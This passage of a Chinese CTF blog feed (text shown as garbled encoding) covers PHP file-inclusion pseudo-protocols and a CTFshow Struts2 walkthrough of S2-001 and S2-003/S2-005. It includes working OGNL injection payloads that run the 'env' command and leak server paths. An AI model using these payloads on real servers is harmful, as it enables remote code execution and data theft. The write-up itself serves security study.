title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>å¾ˆé‡è¦çš„ä¸€å®šæ˜¯å„ç§ä¼ªåè®®äº†</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;ç›´æ¥è¯»å–æ–‡ä»¶ï¼Œä¸å—allow_url_fopenå’Œallow_url_includeå½±å“data:&#x2F;&#x2F;[&lt;MIME-type&gt;][;cherset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;å¯ä»¥ç›´æ¥å¾€é‡Œé¢æ”¾å†…å®¹zip:&#x2F;&#x2F;[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]å¯ä»¥ç›´æ¥è¯»å–å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶php:&#x2F;&#x2F;inputç›´æ¥è¯»å–è¯·æ±‚ä½“çš„æ‰€æœ‰å†…å®¹php:&#x2F;&#x2F;outputçº¯å†™å…¥ä¸ªäººæ„Ÿè§‰è¿˜æ²¡å•¥å¤§ç”¨php:&#x2F;&#x2F;fdåŒ…å«æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„æ–‡ä»¶php:&#x2F;&#x2F;memoryè¯»å†™å†…å­˜çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæ²¡æ„Ÿè§‰æœ‰å•¥åˆ©ç”¨æ–¹æ³•ï¼ˆphp:&#x2F;&#x2F;tempä¸Šé¢çš„å‡çº§ç‰ˆï¼Œåœ¨ä¸´æ—¶æ–‡ä»¶&gt;2MBæ—¶å°±ä¼šä»å†…å­˜ä¸­æ‹‰å‡ºæ¥å˜æˆåœ¨é»˜è®¤sys_get_temp_dirç›®å½•ä¸‹çš„æ–‡ä»¶php:&#x2F;&#x2F;filteræ–‡ä»¶è¯»å–è¿‡æ»¤å™¨phar:&#x2F;&#x2F;å°±æ˜¯pharå•Šä½ è¿˜æƒ³è¦ä»€ä¹ˆï¼ˆå…¶å®ä¹Ÿå¯ä»¥å’Œzipä¸€æ ·è¯»å–å‹ç¼©åŒ…å†…å®¹ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>æœ€èƒ½ç©å‡ºèŠ±æ¥çš„ä¸€ä¸ªåè®®ï¼Œæœ€åŸºç¡€çš„å½“ç„¶æ˜¯base64è¯»å–äº†</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸­é—´convertå¯ç”¨çš„å†…å®¹æœ‰</p><pre class="line-numbers language-none"><code class="language-none">convert.quoted-printable-encodeå°†æ–‡æœ¬ä¸­çš„ä¸å¯è§å­—ç¬¦è½¬æ¢ä¸ºå¯æ‰“å°çš„å­—ç¬¦è¿›è¡Œè¾“å‡ºconvert.quoted-printable-decode ä¸Šè¿°é€†è¿‡ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¯´å®è¯è¿˜æ²¡æ€ä¹ˆè§è¿‡è¿™ä¸ªç”¨æ³•ï¼Œ<del>å€’ä¹Ÿç¡®å®æ²¡å•¥åµç”¨</del></p><p>å…¶ä¸­å¯ç”¨çš„æœ€å¤šçš„å°±æ˜¯è¿™ä¸ª</p><pre class="line-numbers language-none"><code class="language-none">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªè½¬æ¢å™¨å¯ä»¥å°†å†…å®¹ä»ä»»æ„ä¸€ä¸ªç¼–ç è½¬æ¢ä¸ºå¦ä¸€ç§ç¼–ç ï¼Œ<a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p><h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowJava</title>
      <link href="/posts/efe011ec.html"/>
      <url>/posts/efe011ec.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-Java"><a href="#CTFshow-Java" class="headerlink" title="CTFshow Java"></a>CTFshow Java</h1><p>å…¨éƒ¨é¢˜éƒ½æ˜¯struts2<a href="https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">æ¡†æ¶</a>æ¼æ´</p><p>Struts2æ˜¯ç”¨Javaè¯­è¨€ç¼–å†™çš„ä¸€ä¸ªåŸºäº<a href="https://so.csdn.net/so/search?q=MVC&spm=1001.2101.3001.7020">MVC</a>è®¾è®¡æ¨¡å¼çš„Webåº”ç”¨æ¡†æ¶</p><p>æ³¨æ„ä»¥ä¸‹æ‰€æœ‰æ¼æ´éƒ½å¯ä»¥ç›´æ¥åˆ©ç”¨å…¬å¼€çš„è„šæœ¬è¿›è¡Œä¸€é”®åˆ©ç”¨</p><p>é¦–å…ˆè¦äº†è§£ä¸€ä¸‹OGNLä¸­çš„ç‰¹æ®Šç¬¦å·ä½œç”¨</p><blockquote><ul><li><code>%</code>çš„ç”¨é€”æ˜¯åœ¨æ ‡å¿—çš„å±æ€§ä¸ºå­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œè®¡ç®—OGNLè¡¨è¾¾å¼%{}ä¸­çš„å€¼</li><li><code>#</code>çš„ç”¨é€”è®¿ä¸»è¦æ˜¯è®¿é—®éæ ¹å¯¹è±¡å±æ€§ï¼Œå› ä¸ºStruts 2ä¸­å€¼æ ˆè¢«è§†ä¸ºæ ¹å¯¹è±¡ï¼Œæ‰€ä»¥è®¿é—®å…¶ä»–éæ ¹å¯¹è±¡æ—¶ï¼Œéœ€è¦åŠ #å‰ç¼€æ‰å¯ä»¥è°ƒç”¨</li><li><code>$</code>ä¸»è¦æ˜¯åœ¨Struts 2é…ç½®æ–‡ä»¶ä¸­ï¼Œå¼•ç”¨OGNLè¡¨è¾¾å¼</li></ul></blockquote><p>å…³äºOGNLè¯­è¨€çš„ä»‹ç»å¯ä»¥çœ‹<a href="https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">è¿™é‡Œ</a>ï¼Œåœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œåˆ©ç”¨æ˜¯å› ä¸ºstrutså°†å…¶ä½œä¸ºé»˜è®¤è¯­è¨€</p><p>åˆ¤æ–­é¡µé¢æ˜¯å¦åŸºäºStruts2ï¼š</p><ul><li>é€šè¿‡é¡µé¢å›æ˜¾çš„é”™è¯¯æ¶ˆæ¯æ¥åˆ¤æ–­ï¼Œé¡µé¢ä¸å›æ˜¾é”™è¯¯æ¶ˆæ¯æ—¶åˆ™æ— æ•ˆ</li><li>é€šè¿‡ç½‘é¡µåç¼€æ¥åˆ¤æ–­ï¼Œå¦‚.do .actionï¼Œæœ‰å¯èƒ½ä¸å‡†<ul><li>å¦‚æœé…ç½®æ–‡ä»¶ä¸­å¸¸æ•°extensionçš„å€¼ä»¥é€—å·ç»“å°¾æˆ–è€…æœ‰ç©ºå€¼ï¼ŒæŒ‡æ˜äº†actionå¯ä»¥ä¸å¸¦åç¼€ï¼Œé‚£ä¹ˆä¸å¸¦åç¼€çš„uriä¹Ÿå¯èƒ½æ˜¯struts2æ¡†æ¶æ­å»ºçš„</li><li>å¦‚æœä½¿ç”¨Struts2çš„restæ’ä»¶ï¼Œå…¶é»˜è®¤çš„struts-plugin.xmlæŒ‡å®šçš„è¯·æ±‚åç¼€ä¸ºxhtml,xmlå’Œjson</li></ul></li><li>åˆ¤æ–­ /struts/webconsole.html æ˜¯å¦å­˜åœ¨æ¥è¿›è¡Œåˆ¤æ–­ï¼Œéœ€è¦ devMode ä¸º true</li></ul><p><a href="https://github.com/HatBoy/Struts2-Scan">è„šæœ¬é“¾æ¥</a></p><h2 id="ValueStack"><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h2><p>åé¢ä¼šé«˜é¢‘å‡ºç°çš„ä¸€ä¸ªä¸œè¥¿ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹</p><p>é¦–å…ˆStruts2çš„è¿è¡Œæµç¨‹æ˜¯ï¼ˆåé¢çš„å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯åŸºäºè¿™ä¸ªæµç¨‹åˆ†æçš„ï¼‰</p><p><img src="https://taomujian.github.io/img/S2-008/images/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="æµç¨‹å›¾"></p><ol><li><p>HTTPè¯·æ±‚ç»è¿‡ä¸€ç³»åˆ—çš„æ ‡å‡†è¿‡æ»¤å™¨(Filter)ç»„ä»¶é“¾(è¿™äº›æ‹¦æˆªå™¨å¯ä»¥æ˜¯Struts2 è‡ªå¸¦çš„,ä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„,æœ¬ç¯å¢ƒä¸­struts.xmlä¸­çš„packageç»§æ‰¿è‡ªstruts-default,struts-defaultå°±ä½¿ç”¨äº†Struts2è‡ªå¸¦çš„æ‹¦æˆªå™¨.ActionContextCleanUpä¸»è¦æ˜¯æ¸…ç†å½“å‰çº¿ç¨‹çš„ActionContextã€Dispatcher,FilterDispatcherä¸»è¦æ˜¯é€šè¿‡ActionMapperæ¥å†³å®šéœ€è¦è°ƒç”¨é‚£ä¸ªAction,FilterDispatcheræ˜¯æ§åˆ¶å™¨çš„æ ¸å¿ƒ,ä¹Ÿæ˜¯MVCä¸­æ§åˆ¶å±‚çš„æ ¸å¿ƒç»„ä»¶),æœ€ååˆ°è¾¾FilterDispatcherè¿‡æ»¤å™¨.</p></li><li><p>æ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶FilterDispatcheræ ¹æ®ActionMapperä¸­çš„è®¾ç½®ç¡®å®šæ˜¯å¦éœ€è¦è°ƒç”¨æŸä¸ªActionç»„ä»¶æ¥å¤„ç†è¿™ä¸ªHttpServletRequestè¯·æ±‚,å¦‚æœActionMapperå†³å®šè°ƒç”¨æŸä¸ªActionç»„ä»¶,FilterDispatcheræ ¸å¿ƒæ§åˆ¶å™¨ç»„ä»¶å°±ä¼šæŠŠè¯·æ±‚çš„å¤„ç†æƒå§”æ‰˜ç»™ActionProxyç»„ä»¶.</p></li><li><p>ActionProxyç»„ä»¶é€šè¿‡Configuration Managerç»„ä»¶è·å–Struts2æ¡†æ¶çš„é…ç½®æ–‡ä»¶struts.xml,æœ€åæ‰¾åˆ°éœ€è¦è°ƒç”¨çš„ç›®æ ‡Actionç»„ä»¶ç±»,ç„¶åActionProxyç»„ä»¶å°±åˆ›å»ºå‡ºä¸€ä¸ªå®ç°äº†å‘½ä»¤æ¨¡å¼çš„ActionInvocationç±»çš„å¯¹è±¡å®ä¾‹ç±»çš„å¯¹è±¡å®ä¾‹(è¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬è°ƒç”¨Anctionç»„ä»¶æœ¬èº«ä¹‹å‰è°ƒç”¨å¤šä¸ªçš„æ‹¦æˆªå™¨ç»„ä»¶çš„before()æ–¹æ³•)åŒæ—¶ActionInvocationç»„ä»¶é€šè¿‡ä»£ç†æ¨¡å¼è°ƒç”¨ç›®æ ‡Actionç»„ä»¶.ä½†æ˜¯åœ¨è°ƒç”¨ä¹‹å‰ActionInvocationç»„ä»¶ä¼šæ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®é¡¹ç›®åŠ è½½ä¸ç›®æ ‡Actionç»„ä»¶ç›¸å…³çš„æ‰€æœ‰æ‹¦æˆªå™¨ç»„ä»¶(Interceptor)</p></li><li><p>ä¸€æ—¦Actionç»„ä»¶æ‰§è¡Œå®Œæ¯•,ActionInvocationç»„ä»¶å°†æ ¹æ®å¼€å‘äººå‘˜åœ¨Struts2.xmlé…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„å„ä¸ªé…ç½®é¡¹ç›®è·å¾—å¯¹è±¡çš„è¿”å›ç»“æœ,è¿™ä¸ªè¿”å›ç»“æœæ˜¯è¿™ä¸ªActionç»„ä»¶çš„ç»“æœç (æ¯”å¦‚SUCCESSã€INPUT),ç„¶åæ ¹æ®è¿”å›çš„è¯¥ç»“æœè°ƒç”¨ç›®æ ‡JSPé¡µé¢ä»¥å®ç°æ˜¾ç¤ºè¾“å‡º.</p></li><li><p>æœ€åå„ä¸ªæ‹¦æˆªå™¨ç»„ä»¶ä¼šè¢«å†æ¬¡æ‰§è¡Œ(ä½†æ˜¯é¡ºåºå’Œå¼€å§‹æ—¶ç›¸å,å¹¶è°ƒç”¨after()æ–¹æ³•),ç„¶åè¯·æ±‚æœ€ç»ˆè¢«è¿”å›ç»™ç³»ç»Ÿçš„éƒ¨ç½²æ–‡ä»¶ä¸­é…ç½®çš„å…¶ä»–è¿‡æ»¤å™¨,å¦‚æœå·²ç»è®¾ç½®äº†ActionContextCleanUpè¿‡æ»¤å™¨,é‚£ä¹ˆFilterDispatcherå°±ä¸ä¼šæ¸…ç†åœ¨ThreadLocalå¯¹è±¡ä¸­ä¿å­˜çš„ActionContextä¿¡æ¯.å¦‚æœæ²¡æœ‰è®¾ç½®ActionContextCleanUpè¿‡æ»¤å™¨,FilterDispatcherå°±ä¼šæ¸…é™¤æ‰æ‰€æœ‰çš„ThreadLocalå¯¹è±¡.</p></li></ol><h2 id="279"><a href="#279" class="headerlink" title="279"></a>279</h2><p>æ¼æ´ï¼šS2-001</p><p>æ¼æ´æˆå› ï¼šå½“ç”¨æˆ·æäº¤è¡¨å•æ•°æ®ä¸”éªŒè¯å¤±è´¥æ—¶ï¼ŒæœåŠ¡å™¨ä½¿ç”¨OGNLè¡¨è¾¾å¼è§£æç”¨æˆ·å…ˆå‰æäº¤çš„å‚æ•°å€¼ï¼Œ%{value}å¹¶é‡æ–°å¡«å……ç›¸åº”çš„è¡¨å•æ•°æ®</p><p>å½±å“ç‰ˆæœ¬ï¼šWebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p><p>æ¼æ´åˆ†æï¼š</p><ol><li><p>é¦–å…ˆæ–­ç‚¹æ‰“åœ¨æ¥å—å‚æ•°å¹¶éªŒè¯çš„åœ°æ–¹ï¼Œè¿›è€Œè·Ÿè¿›è§¦å‘ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100121467.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100124296.png"></p></li><li><p>ç”±äºéªŒè¯å¤±è´¥å¯¼è‡´è¿”å›errorè¿›è¡Œæ¸²æŸ“ï¼ŒæŸ¥çœ‹å¯¹<code>&lt;s:textfield&gt;</code>æ ‡ç­¾çš„æ¸²æŸ“è§„åˆ™</p><blockquote><p>jspæ–‡ä»¶ä¸­é‡åˆ°Struts2æ ‡ç­¾ &lt;s:textfield æ—¶ç¨‹åºä¼šå…ˆè°ƒç”¨ doStartTag,å¹¶å°†æ ‡ç­¾ä¸­çš„å±æ€§è®¾ç½®åˆ°TextFieldTagå¯¹è±¡ç›¸åº”å±æ€§ä¸­.åœ¨é‡åˆ° /&gt; ç»“æŸæ ‡ç­¾çš„æ—¶å€™è°ƒç”¨doEndTagæ–¹æ³•</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100126720.png"></p></li><li><p>ç›´æ¥åœ¨æ¸²æŸ“å‡½æ•°å¤„æ‰“æ–­ç‚¹ï¼Œåœ¨<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>ä¸­æ‰¾åˆ°ä¸Šè¿°æåˆ°çš„ä¸¤ä¸ªå‡½æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100129583.png"></p></li><li><p>è·Ÿè¿›endæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›evaluateParamsæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªæ–¹æ³•ä¸­å¦‚æœå¼€å¯äº†altSyntaxï¼Œé‚£ä¹ˆå°±ä¼šåœ¨nameå±æ€§çš„å­—æ®µä¸¤è¾¹æ·»åŠ OGNLè¡¨è¾¾å¼å­—ç¬¦ç”Ÿæˆexprå±æ€§ï¼Œæ­¥è¿‡æ‰§è¡Œå‘ç°exprå†…å®¹ç¡®å®è¢«æ”¹å˜<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100134657.png"></p></li><li><p>ç»§ç»­è·Ÿè¿›findValueæ–¹æ³•ï¼Œåœ¨è¿™é‡Œå°±èƒ½çœ‹åˆ°å‡ºé—®é¢˜çš„ç‚¹äº†ï¼Œå°±æ˜¯translateVariablesæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100141364.png"></p></li><li><p>æ­¥å…¥åå‘ç°å…¶åˆè°ƒç”¨äº†åŒåé‡è½½æ–¹æ³•ï¼Œç›´æ¥çœ‹é‡è½½åçš„å‡½æ•°å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100144830.png"></p><blockquote><p>ç¬¬ä¸€æ¬¡è·å–oçš„å€¼,è¿™é‡Œçš„stackä¸ºOgnlValueStack,å®ƒæ˜¯ValueStackçš„å®ç°ç±».ValueStackæ˜¯Struts2çš„ä¸€ä¸ªæ¥å£,è¡¨é¢æ„ä¹‰ä¸ºå€¼æ ˆ,ç±»ä¼¼äºä¸€ä¸ªæ•°æ®ä¸­è½¬ç«™,Struts2çš„æ•°æ®éƒ½ä¼šä¿å­˜åœ¨ValueStackä¸­.Struts2åœ¨å‘èµ·è¯·æ±‚åˆ›å»ºActionå®ä¾‹çš„åŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªOgnlValueStackå€¼æ ˆå®ä¾‹.Struts2ä½¿ç”¨OGNLå°†è¯·æ±‚Actionçš„å‚æ•°å°è£…ä¸ºå¯¹è±¡å­˜å‚¨åˆ°å€¼æ ˆä¸­,å¹¶é€šè¿‡OGNLè¡¨è¾¾å¼è¯»å–å€¼æ ˆä¸­çš„å¯¹è±¡å±æ€§å€¼.</p><p>ValueStackä¸­æœ‰ä¸¤ä¸ªä¸»è¦åŒºåŸŸ:</p><p>â€‹    CompoundRootåŒºåŸŸ:æ˜¯ä¸€ä¸ªArrayList,å­˜å‚¨äº†Actionå®ä¾‹,å®ƒä½œä¸ºOgnlContextçš„Rootå¯¹è±¡.è·å–rootæ•°æ®ä¸éœ€è¦åŠ #</p><p>â€‹    contextåŒºåŸŸ:å³OgnlContextä¸Šä¸‹æ–‡,æ˜¯ä¸€ä¸ªMap,æ”¾ç½®webå¼€å‘å¸¸ç”¨çš„å¯¹è±¡æ•°æ®çš„å¼•ç”¨.requestã€sessionã€parametersã€applicationç­‰.è·å–contextæ•°æ®éœ€è¦åŠ #</p><p>æ“ä½œå€¼æ ˆ,é€šå¸¸æŒ‡çš„æ˜¯æ“ä½œValueStackä¸­çš„rootåŒºåŸŸ.</p><p>OgnlValueStackçš„findValueæ–¹æ³•å¯ä»¥åœ¨CompoundRootä¸­ä»æ ˆé¡¶å‘æ ˆåº•æ‰¾æŸ¥æ‰¾å¯¹è±¡çš„å±æ€§å€¼</p></blockquote><p>ä»¥ä¸Šä¸ºå¤§ä½¬è§£æçš„stackå˜é‡çš„å†…å®¹ï¼Œä¸ç®¡å¦‚ä½•ï¼Œæˆ‘ä»¬ç›´æ¥è·Ÿè¿›åˆ°55è¡Œçš„stackçš„findValueæ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100206870.png">ç»§ç»­æ­¥å…¥åˆ°<code>OgnlUtil.getValue</code>æ–¹æ³•ä¸­ï¼Œç»§ç»­æ­¥å…¥åˆ°<code>Ognl.getValue</code>æ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶å¯¹nameå‚æ•°è¿›è¡Œäº†compileæ“ä½œå¹¶è¿”å›ä¼ å…¥çš„getValueæ–¹æ³•ï¼Œå°†usernameä¸­çš„å†…å®¹å–å‡ºå¹¶æ‰§è¡Œå…¶ä¸­çš„OGNLè¡¨è¾¾å¼<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215156.png">å¦‚æ­¤åå¤å¯ä»¥çœ‹åˆ°æœ€åOGNLè¡¨è¾¾å¼è¢«æˆåŠŸæ‰§è¡Œå¹¶ä¸”ç»“æœå­˜å…¥äº†resultä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100215768.png"></p></li></ol><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// è·å–tomcatè·¯å¾„</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token string">"tomcatBinDir&#123;"</span><span class="token operator">+</span><span class="token annotation punctuation">@java.lang.System</span><span class="token annotation punctuation">@getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token punctuation">&#125;</span><span class="token comment">// è·å–webè·¯å¾„</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#req<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>#req<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#response<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>#a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"env"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b<span class="token operator">=</span>#a<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#d<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="280"><a href="#280" class="headerlink" title="280"></a>280</h2><p>æ¼æ´ï¼šS2-003 S2-005 <em>CVE-2008-6504</em></p><p>æ¼æ´æˆå› ï¼š</p><ul><li>S2-003æˆå› æ˜¯Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œï¼Œè€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ</li><li>S2-005çš„åŸç†å’ŒS2-003åŸºæœ¬ç›¸ä¼¼ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯å‡çº§ç‰ˆçš„S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003</li></ul><p>å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.1.8.1</p><p>æ¼æ´åˆ†æï¼š</p><ol><li>é¦–å…ˆè§¦å‘ç‚¹<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>ï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤çš„<code>denyMethodExecution</code>å€¼æ˜¯trueï¼Œæ”¹ä¸ºfalseæ‰èƒ½ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥payloadä¸­éƒ¨åˆ†å†…å®¹æ˜¯è¦å°†å…¶æ”¹ä¸ºfalseçš„<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111446997.png"></li><li>æŸ¥çœ‹æ‰§è¡Œpayloadåå…¶ä¸­è·å–çš„å‚æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111447204.png"></li><li>æ­¥å…¥setParameterså‡½æ•°ï¼Œå‡½æ•°é€šè¿‡è¿­ä»£å™¨å°†å‚æ•°é€ä¸ªå–å‡º<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111450215.png"></li><li>æ­¥å…¥acceptableNameå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥isAcceptedå‡½æ•°<img 